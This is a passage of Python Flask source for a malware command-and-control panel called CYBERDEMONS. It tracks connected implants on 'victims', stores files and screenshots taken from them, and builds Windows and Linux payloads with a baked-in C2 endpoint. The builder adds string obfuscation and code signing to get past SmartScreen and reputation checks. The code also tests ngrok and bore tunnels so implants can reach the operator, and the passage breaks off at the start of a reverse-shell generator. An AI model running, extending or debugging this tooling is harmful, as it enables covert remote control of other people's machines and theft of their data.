            cat = item.get('category', 'downloads')
            files.append({'type': cat, 'file': item['file'],
                          'path': f"clients/{ip_key}/{cat}/{item['file']}"})
    return jsonify({'output': output, 'count': new_count,
                    'connected': connected, 'files': files})

@app.route('/api/clear/<client_id>', methods=['POST'])
def api_clear(client_id):
    with client_lock:
        if client_id in clients:
            clients[client_id]['output'] = []
    return jsonify({'cleared': True})

@app.route('/api/client/<client_id>')
def api_client_info(client_id):
    with client_lock:
        if client_id not in clients:
            return jsonify({'error': 'Not found'}), 404
        c = clients[client_id]
        return jsonify({
            'id': c['id'],
            'addr': c['addr'],
            'ip': c.get('ip', ''),
            'connected': c['connected'],
            'last_seen': c['last_seen'],
            'first_seen': c.get('first_seen', ''),
            'proto': c.get('proto', 'CYB3'),
            'pubkey': c.get('pubkey', ''),
            'info': c.get('info') or None,
            'info_at': c.get('info_at', 0),
            'last_cmd': c.get('last_cmd') or None
        })


@app.route('/api/client/<client_id>/probe', methods=['POST'])
def api_client_probe(client_id):
    """Re-run the fingerprint on demand (the row has a refresh button).

    Useful when an implant reconnects as a different box, or to confirm
    which machine an IP:port is now behind on a reused DHCP lease.
    """
    with client_lock:
        if client_id not in clients:
            return jsonify({'error': 'Not found'}), 404
    ok, err = probe_client(client_id)
    if not ok:
        return jsonify({'error': err}), 400
    return jsonify({'probing': True})

@app.route('/api/client/<client_id>/files')
def api_client_files(client_id):
    with client_lock:
        if client_id not in clients:
            return jsonify({'error': 'Not found'}), 404
        c = clients[client_id]
        # .get, not []: a client restored from victims.json at startup has no
        # dirs until it actually connects, and this must not 500.
        dirs = c.get('dirs', {})
        ip_key = c.get('ip_key', c.get('ip', ''))
    result = {'downloads': [], 'screenshots': [], 'uploads': []}
    for category, folder in dirs.items():
        if os.path.isdir(folder):
            for f in sorted(os.listdir(folder), reverse=True)[:50]:
                fp = os.path.join(folder, f)
                if os.path.isfile(fp):
                    size = os.path.getsize(fp)
                    mtime = datetime.fromtimestamp(os.path.getmtime(fp)).strftime('%Y-%m-%d %H:%M')
                    rel = f"clients/{ip_key}/{category}/{f}"
                    result[category].append({'name': f, 'size': size, 'modified': mtime, 'path': rel})
    return jsonify(result)

@app.route('/api/client/<client_id>/history')
def api_client_history(client_id):
    with client_lock:
        if client_id not in clients:
            return jsonify({'error': 'Not found'}), 404
        return jsonify(clients[client_id].get('history', []))

@app.route('/files/<path:filepath>')
def serve_file(filepath):
    full = os.path.join(BASE_DIR, filepath)
    if os.path.isfile(full):
        return send_file(full, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404


# --- endpoint sidecar ---------------------------------------------------
# The implant reads cyb.cfg from its own directory, so a tunnel restart that
# changes the public port no longer requires rebuilding the payload. Ship the
# file next to every .exe the builder produces.

CYB_CFG = os.path.join(BUILD_DIR, 'cyb.cfg')


def _baked_endpoint():
    """The C2 host/port currently compiled into pay.cpp."""
    host, port = '127.0.0.1', 7777
    try:
        with open(PAY_CPP) as f:
            src = f.read()
        m = re.search(r'#\s*define\s+C2_HOST\s+"([^"]*)"', src)
        if m:
            host = m.group(1)
        m = re.search(r'#\s*define\s+C2_PORT\s+(\d+)', src)
        if m:
            port = int(m.group(1))
    except OSError:
        pass
    return host, port


_CFG_TEMPLATE = """\
# CYBERDEMONS implant endpoint. Read on every start.
# Edit to repoint this build -- no rebuild needed.
# Precedence: C2_HOST/C2_PORT env vars > this file > built-in default.
C2_HOST={host}
C2_PORT={port}
"""


def _write_cyb_cfg(host, port):
    try:
        with open(CYB_CFG, 'w') as f:
            f.write(_CFG_TEMPLATE.format(host=host, port=port))
        return CYB_CFG
    except OSError as e:
        print(f"[!] could not write cyb.cfg: {e}")
        return None


@app.route('/api/builder/cybcfg', methods=['GET', 'POST'])
def api_cyb_cfg():
    """Read or write the sidecar endpoint config.

    GET  -> current values, plus what is actually compiled into pay.cpp, so a
            stale port is visible instead of being discovered on the target.
    POST -> update and rewrite cyb.cfg.
    """
    global CYB_CFG
    if request.method == 'POST':
        data = request.get_json(silent=True) or {}
        host = (data.get('host') or '').strip()
        try:
            port = int(data.get('port') or 0)
        except (TypeError, ValueError):
            port = 0
        if not host or not (0 < port < 65536):
            return jsonify({'error': 'Need host and port 1-65535'}), 400
        # Keep pay.cpp in step so a rebuild does not silently revert to a
        # different endpoint than the sidecar advertises.
        try:
            with open(PAY_CPP, 'r') as f:
                src = f.read()
            new = re.sub(r'(#\s*define\s+C2_HOST\s+)"[^"]*"', rf'\g<1>"{host}"', src)
            new = re.sub(r'(#\s*define\s+C2_PORT\s+)\d+', rf'\g<1>{port}', new)
            if new != src:
                with open(PAY_CPP, 'w') as f:
                    f.write(new)
        except OSError as e:
            return jsonify({'error': f'pay.cpp not updated: {e}'}), 500
        path = _write_cyb_cfg(host, port)
        return jsonify({'ok': True, 'host': host, 'port': port, 'path': path})

    baked_host, baked_port = None, None
    try:
        with open(PAY_CPP, 'r') as f:
            src = f.read()
        m = re.search(r'#\s*define\s+C2_HOST\s+"([^"]*)"', src)
        baked_host = m.group(1) if m else None
        m = re.search(r'#\s*define\s+C2_PORT\s+(\d+)', src)
        baked_port = int(m.group(1)) if m else None
    except OSError:
        pass

    cfg_host, cfg_port = None, None
    if os.path.isfile(CYB_CFG):
        try:
            with open(CYB_CFG) as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('C2_HOST='):
                        cfg_host = line.split('=', 1)[1].strip()
                    elif line.startswith('C2_PORT='):
                        cfg_port = int(line.split('=', 1)[1].strip())
        except (OSError, ValueError):
            pass

    return jsonify({
        'cfg_exists': os.path.isfile(CYB_CFG),
        'cfg_path': CYB_CFG,
        'cfg_host': cfg_host, 'cfg_port': cfg_port,
        'baked_host': baked_host, 'baked_port': baked_port,
        'mismatch': bool(cfg_port and baked_port and cfg_port != baked_port),
    })


def _tool_cmdlines(tool):
    """Command lines of processes actually *running* `tool`.

    `pgrep -af bore` matches any command line containing the string, so a
    shell whose command line merely mentions it -- a wrapper script, an
    agent's own command, the test I wrote to start one -- was reported as a
    live tunnel. That fed a phantom port into the endpoint check, which then
    said the endpoint matched a tunnel that did not exist.

    `pgrep -x` matches the executable name, so a shell is excluded. The
    arguments then come from /proc, which is authoritative.
    """
    try:
        res = subprocess.run(['pgrep', '-x', tool], capture_output=True,
                             text=True, timeout=5)
    except (OSError, subprocess.SubprocessError):
        return []
    lines = []
    for tok in res.stdout.split():
        if not tok.isdigit():
            continue
        try:
            with open(f'/proc/{tok}/cmdline', 'rb') as f:
                raw = f.read()
        except OSError:
            continue
        if not raw:
            continue                      # kernel thread, or already gone
        argv = raw.split(b'\0')
        # setsid/nohup sit in front of the real tool; find it in the argv
        for i, a in enumerate(argv):
            if os.path.basename(a.decode('utf-8', 'replace')) == tool:
                lines.append(' '.join(x.decode('utf-8', 'replace')
                                      for x in argv[i:] if x))
                break
    return lines


def _tunnels():
    """Every tunnel process we can see, with the local port each forwards.

    Both ngrok and bore can be running at once -- they were, pointing at
    different ports -- so returning only the first one produced confidently
    wrong advice about which endpoint was live.
    """
    found = []
    for tool, pattern in (('ngrok', r'ngrok\s+tcp\s+(\d+)'),
                          ('bore', r'bore\s+local\s+(\d+)')):
        for line in _tool_cmdlines(tool):
            m = re.search(pattern, line)
            if m:
                found.append({'tool': tool, 'local_port': int(m.group(1)),
                              'cmdline': line.strip()[:120]})
    return found


# What a tunnel edge sends back *instead of* relaying. The C2 listener never
# speaks first and never speaks HTTP, so any of this means nothing is between
# us and the implant.
_PROXY_REFUSAL = re.compile(
    r'ERR_NGROK_\d+'            # ngrok: account limit, addr in use, ...
    r'|HTTP/\d'                  # serveo/localhost.run: forward is HTTP
    r'|Bad Request'
    r'|^\s*(?:301|302|400|401|403|404|407|429|500|502|503)\b',
    re.I | re.M)


def _probe(host, port, timeout=6.0):
    """Can an implant actually reach host:port? Try it, rather than guessing.

    Connecting is not enough, and that is the whole bug. A tunnel edge accepts
    the TCP connection and then refuses to relay it -- ngrok with
    ERR_NGROK_729 once the account's monthly TCP allowance is spent, closing
    without ever speaking; serveo with "400 Bad Request" when the forward is
    HTTP rather than raw TCP. The old probe asked only whether
    socket.create_connection() returned 0, so it reported both as *reachable*
    -- a confident false pass, on the one route whose entire job is to tell
    you the truth before you ship a build.

    A live C2 endpoint is identifiable by what it does *not* do: it never
    speaks first, and it never hangs up on a partial frame, because the
    handshake is still blocked in recv_exact waiting for the rest. So:

      * bytes arrive before we send anything -> an edge answered instead of
        relaying (ngrok's ERR_NGROK_*, or an HTTP status line)
      * bytes arrive after a non-HTTP probe     -> HTTP forward, cannot carry
        a binary handshake
      * the peer closes with nothing said       -> nothing is behind it
      * silence throughout                      -> relayed, and genuinely so

    A failed handshake registers no roster row, so probing is safe to repeat.
    """
    started = time.time()

    def _ms():
        return int((time.time() - started) * 1000)

    def _drain(s, budget=512):
        """Read what is already waiting. Returns (bytes, closed)."""
        buf = b''
        try:
            while len(buf) < budget:
                chunk = s.recv(budget - len(buf))
                if not chunk:
                    return buf, True
                buf += chunk
        except socket.timeout:
            pass
        except OSError:
            return buf, True
        return buf, False

    def _verdict(raw):
        """Turn a peer reply into (reason, message)."""
        text = raw.decode('utf-8', 'replace')
        first = next((ln.strip() for ln in text.splitlines() if ln.strip()),
                     '')[:160]
        if 'ERR_NGROK_' in text:
            return 'refused', 'tunnel edge refused, nothing relayed: ' + first
        if _PROXY_REFUSAL.search(text):
            return 'http', ('that endpoint speaks HTTP, not raw TCP: ' + first)
        return 'garbage', f'peer replied before any CYB3 frame: {first!r}'

    def _fail(reason, message):
        return {'ok': False, 'relayed': False, 'reason': reason,
                'ms': _ms(), 'error': message}

    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            ms = _ms()

            # 1. Listen before speaking. An ngrok edge that is going to refuse
            #    has usually already written the reason by the time connect()
            #    returns, and it will hang up rather than answer a probe.
            s.settimeout(min(4.0, timeout))
            early, closed = _drain(s)
            if early:
                reason, msg = _verdict(early)
                return {'ok': False, 'relayed': False, 'reason': reason,
                        'ms': ms, 'error': msg}
            if closed:
                return _fail('closed',
                             'peer hung up without relaying anything')

            # 2. Speak HTTP. A C2 listener does not parse HTTP and is still
            #    blocked in recv_exact waiting for the rest of a 128-byte
            #    frame, so it stays silent; an HTTP-terminating forward
            #    explains itself in one line. This is the only probe that
            #    separates "raw TCP forward" from "http forward" -- sending
            #    NULs or a CYB3 frame leaves serveo and localhost.run silent
            #    too, and they look identical to a working tunnel.
            try:
                s.sendall(b'GET / HTTP/1.0\r\nHost: probe\r\n\r\n')
            except OSError:
                pass
            late, closed = _drain(s)
            if late:
                reason, msg = _verdict(late)
                return {'ok': False, 'relayed': False, 'reason': reason,
                        'ms': ms, 'error': msg}
            if closed:
                return _fail('closed',
                             'peer hung up on a partial frame -- no C2 '
                             'listener behind this endpoint')
            return {'ok': True, 'relayed': True, 'reason': 'ok', 'ms': ms,
                    'error': None}
    except Exception as e:
        return _fail('unreachable', f'{type(e).__name__}: {e}')


def _port_is_bound(port):
    """Is anything actually accepting connections on this local port?

    Checked by connecting rather than by inspecting state, because the
    in-memory listener_threads map only records that a thread was started --
    it stays populated even if the bind failed.
    """
    try:
        with socket.create_connection(('127.0.0.1', port), timeout=1.5):
            return True
    except OSError:
        return False


def _running_listener_ports():
    return [e['port'] for e in _load_listeners()
            if e.get('enabled', True) and _port_is_bound(e['port'])]


def _ngrok_public_endpoint():
    """(host, port) the ngrok edge is publishing, from the local agent API.

    ngrok's public port is allocated per session and changes on every restart,
    so a build baked with last session's port connects to nothing while the
    tunnel looks perfectly healthy. The local agent API on 4040 is the only
    place the current value exists -- it is not in the process command line.
    """
    try:
        with urllib.request.urlopen('http://127.0.0.1:4040/api/tunnels',
                                    timeout=3) as r:
            data = json.loads(r.read().decode())
    except Exception:
        return None
    for t in (data.get('tunnels') or []):
        url = t.get('public_url') or ''
        if not url.startswith('tcp://'):
            continue                     # an http forward cannot carry CYB3
        rest = url[len('tcp://'):]
        if ':' not in rest:
            continue
        host, _, port = rest.rpartition(':')
        try:
            return (host, int(port))
        except ValueError:
            continue
    return None


@app.route('/api/builder/endpoint', methods=['GET', 'POST'])
def api_builder_endpoint():
    """The one place the C2 endpoint is read, written and checked.

    GET  -> baked value, sidecar value, tunnel's local port, listener state
    POST -> write both pay.cpp and cyb.cfg so they cannot drift
    """
    if request.method == 'POST':
        data = request.get_json(silent=True) or {}
        host = (data.get('host') or '').strip()
        try:
            port = int(data.get('port') or 0)
        except (TypeError, ValueError):
            port = 0
        if not host or not (0 < port < 65536):
            return jsonify({'error': 'Need a host and a port 1-65535'}), 400

        try:
            with open(PAY_CPP) as f:
                src = f.read()
            new = re.sub(r'(#\s*define\s+C2_HOST\s+)"[^"]*"', rf'\g<1>"{host}"', src)
            new = re.sub(r'(#\s*define\s+C2_PORT\s+)\d+', rf'\g<1>{port}', new)
            if new == src:
                return jsonify({'error': 'pay.cpp: no C2_HOST/C2_PORT define '
                                         'matched -- is the file intact?'}), 500
            with open(PAY_CPP, 'w') as f:
                f.write(new)
        except OSError as e:
            return jsonify({'error': f'pay.cpp not updated: {e}'}), 500

        cfg_path = _write_cyb_cfg(host, port)
        return jsonify({'ok': True, 'host': host, 'port': port,
                        'cfg_path': cfg_path})

    baked_host, baked_port = _baked_endpoint()
    cfg_host, cfg_port = None, None
    if os.path.isfile(CYB_CFG):
        try:
            with open(CYB_CFG) as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('C2_HOST='):
                        cfg_host = line.split('=', 1)[1].strip()
                    elif line.startswith('C2_PORT='):
                        cfg_port = int(line.split('=', 1)[1].strip())
        except (OSError, ValueError):
            pass

    tunnels = _tunnels()
    running = _running_listener_ports()
    for t in tunnels:
        t['has_listener'] = t['local_port'] in running

    # What the tunnel edge is actually publishing. A stale public port is the
    # single most common "the implant just connects to nothing" cause, and it
    # is invisible unless you compare the baked endpoint against the live
    # tunnel, so compare them here rather than making the operator notice.
    public = _ngrok_public_endpoint()
    tunnel_match = bool(public and public == (baked_host, baked_port))

    return jsonify({
        'baked_host': baked_host, 'baked_port': baked_port,
        'cfg_host': cfg_host, 'cfg_port': cfg_port, 'cfg_path': CYB_CFG,
        'mismatch': bool(cfg_port and baked_port and cfg_port != baked_port),
        'tunnels': tunnels,
        'listeners_running': running,
        'tunnel_public': ({'host': public[0], 'port': public[1]} if public
                          else None),
        'endpoint_matches_tunnel': tunnel_match if public else None,
        # `mismatch` is baked-vs-sidecar drift only. It cannot tell you the
        # tunnel is alive -- that needs a probe, which GET deliberately does
        # not do, so say so rather than letting a false "no mismatch" read as
        # "the endpoint works".
        'mismatch_covers': 'baked vs cyb.cfg only -- use '
                           '/api/builder/endpoint/test to check the tunnel',
    })


@app.route('/api/builder/endpoint/test', methods=['POST'])
def api_builder_endpoint_test():
    """Probe an endpoint without deploying anything.

    This is the check that used to be missing: a wrong tunnel port looks
    exactly like a dead implant until you rebuild, ship and run. Here you find
    out in one click.
    """
    data = request.get_json(silent=True) or {}
    host = (data.get('host') or '').strip()
    try:
        port = int(data.get('port') or 0)
    except (TypeError, ValueError):
        port = 0
    if not host or not (0 < port < 65536):
        return jsonify({'error': 'Need a host and a port 1-65535'}), 400

    result = _probe(host, port)
    tunnels = _tunnels()
    running = _running_listener_ports()
    for t in tunnels:
        t['has_listener'] = t['local_port'] in running

    out = {
        'host': host, 'port': port,
        'reachable': result['ok'], 'relayed': result['relayed'],
        'reason': result['reason'],
        'ms': result['ms'], 'error': result['error'],
        'tunnels': tunnels,
        'listeners_running': running,
    }
    hints = {
        'refused':
            'ngrok refused the connection. This account has spent its monthly '
            'TCP connection allowance -- upgrade, wait for the reset, or point '
            'the build at a different tunnel. A healthy tunnel process and a '
            'bound local port are not enough; nothing is relayed while this '
            'stands.',
        'http':
            'That endpoint terminates HTTP, so it cannot carry the CYB3 '
            'handshake. The protocol is binary and never sends an HTTP request '
            'line. Start the forward as raw TCP (ngrok tcp <port>, or a '
            'TCP-capable relay), not http/https.',
        'closed':
            'The peer hung up without relaying anything. The tunnel is up but '
            'its local port has no listener behind it, or the forward expired.',
        'garbage':
            'Something answered that is not a C2 listener. Check that the '
            'tunnel forwards the port this build is baked with.',
    }
    if out['reason'] in hints:
        out['hint'] = hints[out['reason']]
    return jsonify(out)


# --- Builder ---

@app.route('/builder')
def builder():
    return render_template('builder.html')

@app.route('/api/builder/config')
def api_builder_config():
    try:
        with open(PAY_CPP, 'r') as f:
            content = f.read()
        # pay.cpp stores the endpoint as #define C2_HOST / C2_PORT. This reader
        # used to look for `const char* host = "..."`, which stopped matching
        # when the defines were introduced, so the UI silently reported
        # host="unknown" port=0 the whole time. Try the defines first, then the
        # older inline form, then give up honestly.
        host_m = re.search(r'#\s*define\s+C2_HOST\s+"([^"]*)"', content) \
            or re.search(r'const\s+char\s*\*\s*host\s*=\s*"([^"]*)"', content)
        port_m = re.search(r'#\s*define\s+C2_PORT\s+(\d+)', content) \
            or re.search(r'const\s+int\s+port\s*=\s*(\d+)', content)
        linux_host, linux_port = 'unknown', 0
        try:
            with open(PAY_LINUX_C, 'r') as lf:
                lc = lf.read()
            lh = re.search(r'#\s*define\s+C2_HOST\s+"([^"]+)"', lc)
            lp = re.search(r'#\s*define\s+C2_PORT\s+(\d+)', lc)
            if lh:
                linux_host = lh.group(1)
            if lp:
                linux_port = int(lp.group(1))
        except Exception:
            pass

        icons = [f for f in os.listdir(ICONS_DIR) if f.endswith('.ico')]
        current_icon = icons[0] if icons else 'app.ico'
        baked_host = host_m.group(1) if host_m else 'unknown'
        baked_port = int(port_m.group(1)) if port_m else 0

        # Surface the sidecar too, so a tunnel move is visible in the UI rather
        # than only on the target.
        cfg_host, cfg_port = None, None
        if os.path.isfile(CYB_CFG):
            try:
                with open(CYB_CFG) as f:
                    for line in f:
                        line = line.strip()
                        if line.startswith('C2_HOST='):
                            cfg_host = line.split('=', 1)[1].strip()
                        elif line.startswith('C2_PORT='):
                            cfg_port = int(line.split('=', 1)[1].strip())
            except (OSError, ValueError):
                pass

        return jsonify({
            'host': baked_host,
            'port': baked_port,
            'found_in_source': bool(host_m and port_m),
            'cfg_host': cfg_host,
            'cfg_port': cfg_port,
            'cfg_path': CYB_CFG,
            'mismatch': bool(cfg_port and baked_port and cfg_port != baked_port),
            'linux_host': linux_host,
            'linux_port': linux_port,
            'app_name': 'payload',
            'current_icon': current_icon,
            'psk': get_psk_hex(),
            'proto': 'CYB3',
            'cipher': 'X25519 + ChaCha20-Poly1305',
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/builder/psk/rotate', methods=['POST'])
def api_builder_rotate_psk():
    """Issue a fresh PSK.  Implants built against the previous one will fail
    the handshake from now on, which is the point of rotating it."""
    key = rotate_psk()
    return jsonify({'psk': key.hex(),
                    'warning': 'existing implants will no longer connect'})


@app.route('/api/builder/config', methods=['POST'])
def api_builder_update():
    data = request.get_json(silent=True) or {}
    host = (data.get('host') or '').strip()
    try:
        port = int(data.get('port') or 0)
    except (TypeError, ValueError):
        return jsonify({'error': 'port must be an integer'}), 400
    if not host:
        return jsonify({'error': 'host is required'}), 400
    if not (1 <= port <= 65535):
        return jsonify({'error': 'port must be 1-65535'}), 400

    # The PSK is validated as exactly 64 hex characters before it is ever
    # substituted into a C string literal, so it cannot break out of the
    # quotes or inject source.
    psk_hex = str(data.get('psk') or get_psk_hex()).strip()
    if not re.fullmatch(r'[0-9a-fA-F]{64}', psk_hex):
        return jsonify({'error': 'PSK must be 64 hex characters'}), 400
    psk_bytes = bytes.fromhex(psk_hex)

    try:
        with open(PAY_CPP, 'r') as f:
            content = f.read()
        # pay.cpp stores the endpoint as #define C2_HOST / C2_PORT.
        # The old regexes looked for `const char* host` / `const int port`,
        # which no longer exist in the source, so the substitution silently
        # did nothing and the builder reported success without changing
        # anything. Match the defines directly.
        content = re.sub(r'#\s*define\s+C2_HOST\s+"[^"]*"',
                         f'#define C2_HOST "{host}"', content)
        content = re.sub(r'#\s*define\s+C2_PORT\s+\d+',
                         f'#define C2_PORT {port}', content)
        content = re.sub(r'#\s*define\s+PSK_HEX\s+"[0-9a-fA-F]*"',
                         f'#define PSK_HEX "{psk_hex}"', content)
        with open(PAY_CPP, 'w') as f:
            f.write(content)

        if os.path.exists(PAY_LINUX_C):
            with open(PAY_LINUX_C, 'r') as f:
                lc = f.read()
            lc = re.sub(r'#\s*define\s+C2_HOST\s+"[^"]*"',
                        f'#define C2_HOST "{host}"', lc)
            lc = re.sub(r'#\s*define\s+C2_PORT\s+\d+',
                        f'#define C2_PORT {port}', lc)
            lc = re.sub(r'#\s*define\s+PSK_HEX\s+"[0-9a-fA-F]*"',
                        f'#define PSK_HEX "{psk_hex}"', lc)
            with open(PAY_LINUX_C, 'w') as f:
                f.write(lc)

        # Keep the sidecar config in sync so a rebuilt payload and the
        # shipped cyb.cfg agree on the endpoint.
        _write_cyb_cfg(host, port)

        return jsonify({'saved': True, 'host': host, 'port': port, 'psk': psk_hex})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/builder/icon', methods=['POST'])
def api_builder_upload_icon():
    if 'icon' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    f = request.files['icon']
    if not f.filename.endswith('.ico'):
        return jsonify({'error': 'Must be .ico file'}), 400
    path = os.path.join(ICONS_DIR, 'custom.ico')
    f.save(path)
    # Update resources.rc to point to new icon
    shutil.copy2(path, os.path.join(BASE_DIR, 'app.ico'))
    return jsonify({'saved': True, 'icon': 'custom.ico'})

@app.route('/api/builder/build', methods=['POST'])
def api_builder_build():
    global build_status
    if build_status['running']:
        return jsonify({'error': 'Build already running'}), 400

    data = request.get_json() or {}
    app_name = data.get('app_name', 'payload').strip() or 'payload'
    platform = data.get('platform', 'windows').strip().lower()

    build_status = {'running': True, 'last_output': '', 'success': False, 'exe_path': ''}

    def build_thread():
        global build_status
        try:
            # String encryption is on unless the panel says otherwise. When it
            # fails the build fails -- see obfuscate_sources().
            obfuscate = bool(data.get('obfuscate', True))
            if platform == 'linux':
                # Linux build
                cc = os.environ.get('CC', 'gcc')
                exe_name = app_name if app_name != 'payload' else 'payload.elf'
                exe_out = os.path.join(BUILD_DIR, exe_name)
                src = PAY_LINUX_C

                # Check if X11 is available
                x11_flag = '-lX11' if os.path.exists('/usr/include/X11/Xlib.h') or os.path.exists('/usr/lib/libX11.so') else '-DNO_X11'

                incs, obf_err = [], ''
                if obfuscate:
                    incs, obf_err = obfuscate_sources(src, os.path.join(BUILD_DIR, 'obf'))
                    if obf_err:
                        build_status.update({'running': False, 'last_output': obf_err,
                                             'success': False})
                        return
                    src = os.path.join(BUILD_DIR, 'obf', os.path.basename(src))

                cmd = [cc, '-o', exe_out, src]
                for inc in incs:
                    cmd.append('-I' + inc)
                cmd += [x11_flag, '-lpthread', '-lcrypt', '-ldl', '-lm',
                        '-s', '-O2', '-Wall']
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

                output = r.stdout + r.stderr
                success = r.returncode == 0 and os.path.isfile(exe_out)
                build_status.update({
                    'running': False,
                    'last_output': output or ('Build succeeded' if success else 'Unknown error'),
                    'success': success,
                    'exe_path': exe_out if success else '',
                    'exe_name': exe_name if success else ''
                })
            else:
                # Windows cross-build
                windres = 'x86_64-w64-mingw32-windres'
                gxx = 'x86_64-w64-mingw32-g++'
                res_o = os.path.join(BUILD_DIR, 'resources.o')
                exe_name = f"{app_name}.exe" if app_name != 'payload' else 'payload.exe'
                exe_out = os.path.join(BUILD_DIR, exe_name)

                # Per-build .rc so OriginalFilename matches the actual output name.
                # A binary named da.exe claiming to be msedge.exe is a visible
                # inconsistency in file properties and trips reputation checks.
                rc_in = _render_rc(app_name, exe_name)
                cmd1 = [windres, rc_in, '-I', BASE_DIR, '-o', res_o]
                r1 = subprocess.run(cmd1, capture_output=True, text=True, timeout=60)
                if r1.returncode != 0:
                    build_status.update({'running': False, 'last_output': f'windres failed:\n{r1.stderr}', 'success': False})
                    return

                # win64 only: -m64 is redundant for this toolchain (x86_64-w64-mingw32
                # is x86-64 by definition) but makes the 64-bit target explicit and
                # guards against a 32-bit toolchain being dropped in.
                #
                # minimal=True compiles a command-execution-only implant: no file
                # transfer, screen capture, process enumeration, process kill or
                # registry persistence. The handlers are not compiled in, so those
                # APIs are never imported -- the capability is absent, not hidden.
                # GDI32/CRYPT32/ADVAPI32/IPHLPAPI drop out of the import table.
                minimal = bool(data.get('minimal', False))
                incs, obf_err = [], ''
                src = PAY_CPP
                if obfuscate:
                    incs, obf_err = obfuscate_sources(src, os.path.join(BUILD_DIR, 'obf'))
                    if obf_err:
                        build_status.update({'running': False, 'last_output': obf_err,
                                             'success': False})
                        return
                    src = os.path.join(BUILD_DIR, 'obf', os.path.basename(src))

                cmd2 = [gxx, '-m64']
                if minimal:
                    cmd2.append('-DCYB_MINIMAL')
                for inc in incs:
                    cmd2.append('-I' + inc)
                cmd2 += ['-o', exe_out, src, res_o, '-s', '-O2', '-mwindows',
                         '-lws2_32', '-liphlpapi']
                if not minimal:
                    # CRYPT32 (base64 transfer), GDI32 (screen), USER32 (DC +
                    # metrics), psapi. Unused libs only add import surface.
                    cmd2 += ['-lcrypt32', '-lgdi32', '-luser32', '-lpsapi']
                r2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=120)

                output = r2.stdout + r2.stderr
                success = r2.returncode == 0 and os.path.isfile(exe_out)

                if success:
                    # Authenticode-sign so Windows reports a publisher instead of
                    # "Unknown publisher". Signing is skipped silently when no key
                    # is present, so the build still works unsigned.
                    signed, sig_msg = _sign_exe(exe_out)
                    output += sig_msg
                    if not signed:
                        # Unsigned + Mark-of-the-Web means SmartScreen blocks it.
                        output += ('\n[warn] built UNSIGNED - SmartScreen will block this '
                                   'on a host with SmartScreen enabled\n')
                    # Ship cyb.cfg beside the exe so the endpoint can be changed
                    # on the target without a rebuild. The tunnel's public port
                    # moves on every restart, so a baked-only port goes stale.
                    cfg = _write_cyb_cfg(*_baked_endpoint())
                    if cfg:
                        h, p = _baked_endpoint()
                        output += f'[cfg] wrote {cfg} ({h}:{p})\n'
                build_status.update({
                    'running': False,
                    'last_output': output or ('Build succeeded' if success else 'Unknown error'),
                    'success': success,
                    'exe_path': exe_out if success else '',
                    'exe_name': exe_name if success else ''
                })
        except Exception as e:
            build_status.update({'running': False, 'last_output': str(e), 'success': False})

    t = threading.Thread(target=build_thread, daemon=True)
    t.start()
    return jsonify({'started': True, 'app_name': app_name, 'platform': platform})

@app.route('/api/builder/status')
def api_builder_status():
    return jsonify(build_status)

@app.route('/api/builder/download')
def api_builder_download():
    if build_status['success'] and os.path.isfile(build_status['exe_path']):
        name = build_status.get('exe_name', 'payload.exe')
        return send_file(build_status['exe_path'], as_attachment=True, download_name=name)
    return jsonify({'error': 'No built exe available'}), 404

def handle_download_response(data, dldir):
    rest = data[10:]
    sep = rest.find('|')
    if sep == -1:
        return None
    fpath = rest[:sep]
    b64_data = rest[sep + 1:]
    try:
        file_bytes = base64.b64decode(b64_data)
        fname = f"{datetime.now().strftime('%H%M%S')}_{os.path.basename(fpath)}"
        with open(os.path.join(dldir, fname), 'wb') as f:
            f.write(file_bytes)
        return fname
    except:
        return None

def handle_screenshot_response(data, sdir):
    rest = data[12:]
    sep = rest.find('|')
    if sep == -1:
        return None
    dims = rest[:sep]
    b64_data = rest[sep + 1:]
    try:
        file_bytes = base64.b64decode(b64_data)
        fname = f"screenshot_{dims}_{datetime.now().strftime('%H%M%S')}.bmp"
        with open(os.path.join(sdir, fname), 'wb') as f:
            f.write(file_bytes)
        return fname
    except:
        return None

# --- Multi-Port Listener API ---

@app.route('/api/listeners')
def api_listeners():
    loaded = _load_listeners()
    result = []
    for entry in loaded:
        port = entry['port']
        running = port in listener_threads
        result.append({
            'port': port,
            'enabled': entry.get('enabled', True),
            'running': running,
            'clients': sum(1 for c in clients.values() if c.get('connected', False))
        })
    return jsonify(result)

@app.route('/api/listeners/add', methods=['POST'])
def api_listener_add():
    data = request.get_json()
    port = int(data.get('port', 7777))
    if port < 1 or port > 65535:
        return jsonify({'error': 'Invalid port'}), 400
    lst = _load_listeners()
    if any(e['port'] == port for e in lst):
        return jsonify({'error': f'Port {port} already configured'}), 400
    lst.append({'port': port, 'enabled': True})
    _save_listeners(lst)
    _start_listener(port)
    return jsonify({'port': port, 'running': True})

@app.route('/api/listeners/<int:port>/toggle', methods=['POST'])
def api_listener_toggle(port):
    lst = _load_listeners()
    for entry in lst:
        if entry['port'] == port:
            entry['enabled'] = not entry.get('enabled', True)
            if entry['enabled']:
                _start_listener(port)
            else:
                _stop_listener(port)
            _save_listeners(lst)
            return jsonify({'port': port, 'enabled': entry['enabled'], 'running': port in listener_threads})
    return jsonify({'error': 'Not found'}), 404

@app.route('/api/listeners/<int:port>', methods=['DELETE'])
def api_listener_remove(port):
    lst = _load_listeners()
    new = [e for e in lst if e['port'] != port]
    if len(new) == len(lst):
        return jsonify({'error': 'Not found'}), 404
    _stop_listener(port)
    _save_listeners(new)
    return jsonify({'removed': port})

# --- Settings / Assets ---

STATIC_DIR = os.path.join(BASE_DIR, 'static')
os.makedirs(STATIC_DIR, exist_ok=True)

@app.route('/api/settings/logo', methods=['POST'])
def api_upload_logo():
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    f = request.files['file']
    f.save(os.path.join(STATIC_DIR, 'logo.png'))
    return jsonify({'saved': True, 'url': '/static/logo.png'})

@app.route('/api/settings/bg', methods=['POST'])
def api_upload_bg():
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    f = request.files['file']
    f.save(os.path.join(STATIC_DIR, 'bg.jpg'))
    return jsonify({'saved': True, 'url': '/static/bg.jpg'})

# --- Reverse Shell Generator ---

REVERSE_SHELLS = {
